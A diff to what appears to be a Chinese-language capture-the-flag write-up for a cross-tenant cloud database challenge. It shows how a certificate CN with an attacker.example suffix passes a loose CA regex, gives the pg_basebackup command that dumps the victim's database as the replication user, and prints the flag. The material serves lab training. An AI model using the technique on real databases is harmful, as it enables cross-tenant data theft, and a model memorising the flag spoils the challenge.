@@ -33,8 +33,10 @@
 2. Step 2：向内部 CA 申请客户端证书，CN 为
    `replication.<victim-id>.database.azure.com.attacker.example`
    （尾部后缀，CA 的正则允许）。
-3. Step 3：`pg_basebackup -h victim-pg -U replication … --sslmode=require`
+3. Step 3：通过宿主机公开入口执行
+   `pg_basebackup -h 127.0.0.1 -p 10627 -U replication … --sslmode=require`
    以复制用户身份拉取受害者整库，flag 在备份文件中。
+   （`victim-pg` 内部名仅存在于 debug/attacker 部署语境。）
 
 ## Flag
 `flag{cloud-16-cross-tenant-db}`
